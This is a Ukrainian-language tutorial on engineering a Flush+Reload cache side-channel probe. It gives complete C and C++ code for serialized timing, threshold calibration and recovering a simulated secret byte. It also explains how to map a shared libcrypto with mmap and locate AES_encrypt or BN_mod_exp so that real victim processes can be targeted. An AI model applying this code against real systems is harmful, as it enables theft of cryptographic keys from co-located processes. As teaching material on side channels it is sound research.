# ⚙️ Інженерна реалізація та калібрування зонда Flush+Reload

Створення надійного вимірювального зонда на основі сайд-каналу Flush+Reload вимагає суворого врахування тонкощів мікроархітектури процесора: запобігання спрацьовуванню апаратних префетчерів, коректної серіалізації конвеєра при зчитуванні лічильника тактів та автоматичного калібрування порогу виявлення на конкретному залізі. Нижче наведено детальний розбір інженерних принципів побудови зонда та його завершену практичну реалізацію мовами C та C++.

### Архітектура та компоненти вимірювального зонда

Практичний вимірювальний зонд Flush+Reload складається з трьох взаємопов'язаних функціональних блоків:

1. **Масив-зонд (Probe Array):** масив пам'яті, що містить 256 вимірювальних зон (по одній на кожне можливе значення секретного байта від 0 до 255). Крок між зонами становить **4096 байтів (4 КБ)** — розмір стандартної сторінки віртуальної пам'яті. Це гарантує, що кожне значення потрапляє в окрему лінію кешу і розташоване в окремій сторінці, що унеможливлює активацію апаратного потокового префетчера процесора (Hardware Stream Prefetcher).
2. **Серіалізований таймер (Timing Primitive):** функція, яка поєднує зчитування лічильника `RDTSCP` з бар'єром завантаження `LFENCE`, виключаючи позачергове виконання інструкцій вимірювання планувальником процесора.
3. **Модуль калібрування (Threshold Calibration):** статистичний блок, який збирає вибірки часу для кешованих (Hit) та некешованих (Miss) станів і визначає розділовий поріг `T`.

```
Масив probe (256 сторінок по 4096 байтів):
+---------------+---------------+---------------+-----+-----------------+
| Сторінка 0    | Сторінка 1    | Сторінка 2    | ... | Сторінка 255    |
| (значення 0)  | (значення 1)  | (значення 2)  |     | (значення 255)  |
| offset 0      | offset 4096   | offset 8192   |     | offset 1044480  |
+---------------+---------------+---------------+-----+-----------------+
```

### Відображення спільних бібліотек через `mmap`

Якщо зонд атакує не штучний масив, а реальну системну бібліотеку жертви (наприклад, `libcrypto.so.1.1`), атакуючий використовує системний виклик `mmap()`:

:::tabs
```c
int fd = open("/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1", O_RDONLY);
void *mapped_lib = mmap(NULL, file_size, PROT_READ, MAP_SHARED, fd, 0);
```
```cpp
const int fd = ::open("/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1", O_RDONLY);
auto* mapped_lib = static_cast<std::uint8_t*>(::mmap(nullptr, file_size, PROT_READ, MAP_SHARED, fd, 0));
```
:::

Критично важливим є прапорець **`MAP_SHARED`**: він вказує ядру операційної системи підключити наявний фізичний кеш сторінок (Page Cache), який уже використовується процесом-жертвою. Якщо помилково вказати `MAP_PRIVATE`, ядро може створити приватну копію при першому доступі (Copy-On-Write), що розірве зв'язок між кешами двох процесів.

Щоб знайти точне зміщення цільової функції (наприклад, таблиці `AES_encrypt` або `BN_mod_exp`), атакуючий аналізує заголовок ELF (розділи `.symtab` та `.dynsym`) утилітою `nm` або `readelf`, після чого додає отримане зміщення до базової адреси `mapped_lib`.

### Механіка серіалізації конвеєра та бар'єри `LFENCE`

Найбільш підступною помилкою при розробці зонда є наївне вимірювання часу через пару викликів `__rdtsc()`. Оскільки процесор з позачерговим виконанням вільно перевпорядковує незалежні мікрооперації, інструкція читання таймера може виконатися задовго до того, як дані дійдуть з оперативної пам'яті.

Щоб ізолювати операцію читання пам'яті в строгому часовому вікні, застосовують двосторонній бар'єр серіалізації:

1. Перший виклик `_mm_lfence()` очікує завершення всіх попередніх інструкцій у конвеєрі.
2. Інструкція `__rdtscp(&aux)` зчитує 64-бітний лічильник тактів та ідентифікатор поточного ядра CPU.
3. Другий виклик `_mm_lfence()` гарантує, що наступна операція читання пам'яті `(void)*addr` не почнеться раніше, ніж завершиться виклик таймера.
4. Після операції читання пам'яті встановлюється третій бар'єр `_mm_lfence()`, який змушує ядро дочекатися реального надходження байта з кешу або DRAM.
5. Фінальний виклик `__rdtscp(&aux)` фіксує точний момент завершення завантаження даних.

Така послідовність гарантує, що виміряна різниця тактів відображає виключно фізичну затримку завантаження лінії пам'яті крізь кеш-ієрархію.

### Повний код вимірювального модуля

:::tabs
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define PROBE_ENTRIES 256
#define CALIBRATION_ROUNDS 2000

/* Виділення пам'яті для масиву-зонда */
static uint8_t probe_array[PROBE_ENTRIES * PAGE_SIZE];

/* Точне вимірювання затримки читання пам'яті в тактах CPU */
static inline uint64_t measure_access_time(volatile void *addr) {
    uint32_t aux;
    uint64_t start_tsc, end_tsc;

    /* Серіалізація конвеєра перед початком вимірювання */
    _mm_lfence();
    start_tsc = __rdtscp(&aux);
    _mm_lfence();

    /* Зчитування цільової адреси пам'яті */
    (void)*(volatile uint8_t *)addr;

    /* Серіалізація конвеєра після завершення завантаження даних */
    _mm_lfence();
    end_tsc = __rdtscp(&aux);
    _mm_lfence();

    return end_tsc - start_tsc;
}

/* Примусове витіснення лінії пам'яті з усіх рівнів кешу */
static inline void flush_memory_line(volatile void *addr) {
    _mm_clflush((const void *)addr);
}

/* Автоматичне калібрування оптимального порогу відсікання Hit/Miss */
static uint64_t calibrate_timing_threshold(void) {
    uint64_t hit_total = 0;
    uint64_t miss_total = 0;
    volatile uint8_t *test_addr = &probe_array[0];

    /* Попередній прогрів сторінки для уникнення затримок Page Fault */
    *test_addr = 0xAA;

    for (int i = 0; i < CALIBRATION_ROUNDS; ++i) {
        /* Замір часу доступу до кешованої лінії (Hit) */
        (void)*test_addr;
        _mm_lfence();
        hit_total += measure_access_time(test_addr);

        /* Замір часу доступу після витіснення (Miss) */
        flush_memory_line(test_addr);
        _mm_mfence();
        miss_total += measure_access_time(test_addr);
    }

    uint64_t hit_avg = hit_total / CALIBRATION_ROUNDS;
    uint64_t miss_avg = miss_total / CALIBRATION_ROUNDS;

    printf("[Калібрування] Середній Hit: %lu тактів, Середній Miss: %lu тактів\n",
           hit_avg, miss_avg);

    /* Поріг як зважене середнє між піками */
    return (hit_avg + miss_avg) / 2;
}

int main(void) {
    /* Прив'язка процесу до нульового ядра для усунення дрижання планувальника */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    /* Ініціалізація та розгортання сторінок у фізичну пам'ять */
    memset(probe_array, 0x55, sizeof(probe_array));

    uint64_t threshold = calibrate_timing_threshold();
    printf("[Ініціалізація] Встановлено поріг виявлення: %lu тактів\n\n", threshold);

    /* 1. Фаза FLUSH: очищення всіх 256 контрольних сторінок */
    for (int i = 0; i < PROBE_ENTRIES; ++i) {
        flush_memory_line(&probe_array[i * PAGE_SIZE]);
    }
    _mm_mfence();

    /* 2. Імітація дії жертви: доступ до комірки з секретним індексом */
    uint8_t secret_value = 187; /* Секретне значення, що вивчається */
    volatile uint8_t *victim_target = &probe_array[secret_value * PAGE_SIZE];
    (void)*victim_target; /* Жертва звертається до пам'яті */

    _mm_mfence();

    /* 3. Фаза RELOAD: вимірювання часу доступу до всіх 256 сторінок */
    int detected_value = -1;
    uint64_t min_latency = UINT64_MAX;

    for (int i = 0; i < PROBE_ENTRIES; ++i) {
        volatile void *target = &probe_array[i * PAGE_SIZE];
        uint64_t latency = measure_access_time(target);

        if (latency < threshold && latency < min_latency) {
            min_latency = latency;
            detected_value = i;
        }
    }

    if (detected_value != -1) {
        printf("[Успіх] Відновлено значення секрету: %d (затримка: %lu тактів)\n",
               detected_value, min_latency);
    } else {
        printf("[Помилка] Секрет не виявлено (усі лінії дали Miss)\n");
    }

    return 0;
}
```
```cpp
#include <iostream>
#include <array>
#include <span>
#include <vector>
#include <numeric>
#include <algorithm>
#include <cstdint>
#include <cstring>
#include <sched.h>
#include <immintrin.h>
#include <x86intrin.h>

namespace sidechannel {

constexpr std::size_t PageSize = 4096;
constexpr std::size_t ProbeEntries = 256;
constexpr std::size_t CalibrationRounds = 2000;

class FlushReloadProbe {
public:
    FlushReloadProbe() {
        /* Прив'язка до ядра для мінімізації між'ядерного шуму */
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(0, &cpuset);
        sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

        /* Примусова ініціалізація пам'яті для виділення фізичних сторінок */
        probe_storage_.fill(0x55);
        calibrate();
    }

    /* Витіснення лінії пам'яті за заданим індексом зонда */
    void flush_entry(std::size_t index) noexcept {
        _mm_clflush(get_entry_address(index));
    }

    /* Очищення всього вимірювального масиву */
    void flush_all() noexcept {
        for (std::size_t i = 0; i < ProbeEntries; ++i) {
            flush_entry(i);
        }
        _mm_mfence();
    }

    /* Вимірювання затримки доступу до конкретної зони зонда */
    [[nodiscard]] std::uint64_t reload_entry(std::size_t index) const noexcept {
        const volatile void* addr = get_entry_address(index);
        std::uint32_t aux = 0;

        _mm_lfence();
        const std::uint64_t start = __rdtscp(&aux);
        _mm_lfence();

        (void)*static_cast<const volatile std::uint8_t*>(addr);

        _mm_lfence();
        const std::uint64_t end = __rdtscp(&aux);
        _mm_lfence();

        return end - start;
    }

    /* Повний цикл виявлення найшвидшої кеш-лінії */
    [[nodiscard]] std::pair<int, std::uint64_t> detect_hit() const noexcept {
        int best_index = -1;
        std::uint64_t min_latency = std::numeric_limits<std::uint64_t>::max();

        for (std::size_t i = 0; i < ProbeEntries; ++i) {
            const std::uint64_t latency = reload_entry(i);
            if (latency < threshold_ && latency < min_latency) {
                min_latency = latency;
                best_index = static_cast<int>(i);
            }
        }
        return {best_index, min_latency};
    }

    /* Отримання покажчика на конкретну сторінку зонда (для жертви) */
    [[nodiscard]] volatile std::uint8_t* entry_ptr(std::size_t index) noexcept {
        return &probe_storage_[index * PageSize];
    }

    [[nodiscard]] std::uint64_t threshold() const noexcept { return threshold_; }

private:
    [[nodiscard]] const volatile void* get_entry_address(std::size_t index) const noexcept {
        return &probe_storage_[index * PageSize];
    }

    void calibrate() {
        std::uint64_t hit_total = 0;
        std::uint64_t miss_total = 0;
        volatile auto* test_addr = &probe_storage_[0];

        *test_addr = 0xAA;

        for (std::size_t i = 0; i < CalibrationRounds; ++i) {
            (void)*test_addr;
            _mm_lfence();
            hit_total += reload_entry(0);

            flush_entry(0);
            _mm_mfence();
            miss_total += reload_entry(0);
        }

        const std::uint64_t hit_avg = hit_total / CalibrationRounds;
        const std::uint64_t miss_avg = miss_total / CalibrationRounds;
        threshold_ = (hit_avg + miss_avg) / 2;

        std::cout << "[Калібрування C++] Середній Hit: " << hit_avg
                  << " тактів, Miss: " << miss_avg
                  << " тактів. Поріг: " << threshold_ << " тактів.\n";
    }

    alignas(PageSize) std::array<std::uint8_t, ProbeEntries * PageSize> probe_storage_{};
    std::uint64_t threshold_{140};
};

} // namespace sidechannel

int main() {
    sidechannel::FlushReloadProbe probe;

    /* 1. Фаза FLUSH */
    probe.flush_all();

    /* 2. Дія жертви */
    constexpr std::uint8_t secret = 204;
    *probe.entry_ptr(secret) = 0xFF; // звернення жертви
    _mm_mfence();

    /* 3. Фаза RELOAD */
    const auto [recovered, latency] = probe.detect_hit();

    if (recovered >= 0) {
        std::cout << "[Успіх C++] Відновлено секретний байт: " << recovered
                  << " (час читання: " << latency << " тактів)\n";
    } else {
        std::cerr << "[Помилка C++] Секрет не виявлено в кеші.\n";
    }

    return 0;
}
```
:::

### Практичні інженерні підводні камені

Під час експлуатації зонда на реальних апаратних системах виникають чотири критичні проблеми, які потребують спеціальної обробки:

1. **Ліниве виділення пам'яті ядром ОС (Demand Paging):** якщо виділити великий масив пам'яті через `malloc` або `std::array`, операційна система Linux виділяє лише віртуальні адреси без прив'язки до фізичних фреймів DRAM (Copy-On-Write або нульова сторінка). Перше читання кожної сторінки викликає системне переривання Page Fault (затримка 2000–5000 тактів). Щоб усунути цей артефакт, масив зонда обов'язково прогрівають (`memset` або запис у кожну сторінку) до початку вимірювань.
2. **Міграція потоку між ядрами (Thread Migration):** якщо операційна система переносить вимірювальний потік на інше фізичне ядро посеред фази Reload, локальні лічильники TSC та приватні кеші L1/L2 змінюють стан. У промислових тестах потік жорстко прив'язують до конкретного ядра за допомогою системного виклику `sched_setaffinity()` або `pthread_setaffinity_np()`.
3. **Крок масиву менший за 4096 байтів:** якщо обрати крок зонда рівним 64 або 128 байтам, апаратний префетчер процесора виявляє лінійний доступ і завантажує сусідні лінії ще до того, як зонд виконає вимірювання, що призводить до суцільних хибних спрацьовувань.
4. **Динамічна зміна тактової частоти (DVFS / Turbo Boost):** зміна частоти ядра під час тривалого експерименту призводить до плавання часового порогу `T`. Для високоточних вимірювань рекомендується переводити процесор у фіксований профіль продуктивності (`cpupower frequency-set -g performance`) або використовувати інваріантний лічильник тактів (Invariant TSC).
5. **Топологія NUMA та міжсокетні шини (UPI / Infinity Fabric):** у багатопроцесорних серверах із кількома фізичними сокетами кеш L3 розділений між сокетами. Якщо атакуючий і жертва закріплені за різними сокетами NUMA, сигнал інвалідації `CLFLUSH` та доступ до пам'яті передаються через міжсокетні лінки (Intel UPI або AMD Infinity Fabric). Це збільшує затримку промаху (Miss) до 350–500 тактів і підвищує дисперсію `σ_miss`, що вимагає повторного калібрування порогу безпосередньо для міжсокетного домену.
